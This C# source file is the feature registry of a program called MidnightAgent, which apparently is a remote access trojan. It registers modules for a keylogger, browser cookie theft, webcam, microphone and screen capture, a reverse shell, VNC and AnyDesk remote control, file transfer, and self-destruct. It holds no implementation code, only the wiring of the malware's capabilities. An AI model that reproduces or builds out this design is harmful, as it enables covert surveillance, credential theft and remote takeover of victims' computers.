namespace MidnightAgent.Features
{
    /// <summary>
    /// Registry of all available features
    /// ADD NEW FEATURES HERE!
    /// </summary>
    public static class FeatureRegistry
    {
        public static IFeature[] GetAllFeatures()
        {
            return new IFeature[]
            {
                // Core
                new HelpFeature(),
                new JobFeature(),
                new MenuFeature(),
                new NickFeature(), // 🏷️ Nickname Support

                new SystemInfoFeature(),
                new LocationFeature(),
                new LogFeature(),
                
                // Shell & Commands
                new ShellFeature(),
                new CdFeature(),
                
                // Files & Media
                new FileDownloadFeature(),
                new FileUploadFeature(),
                new ScreenshotFeature(),
                new WebcamFeature(),
                new StreamCamFeature(),

                new CookieFeature(),
                new KeyloggerFeature(),
                new SearchFeature(),
                new MicFeature(),
                
                // Process
                new ProcessFeature(),
                new KillProcessFeature(),
                
                // System Control
                new WallpaperFeature(),
                new RevShellFeature(),
                new VncFeature(),
                new AnyDeskFeature(), // 🖥️ Remote Desktop
                new FtpFeature(),
                new WebFeature(),
                
                // Maintenance
                new UpdateFeature(),
                new TerminateFeature(),
                new RestartFeature(), // /reboot
                new SelfDestructFeature()
            };
        }
    }
}
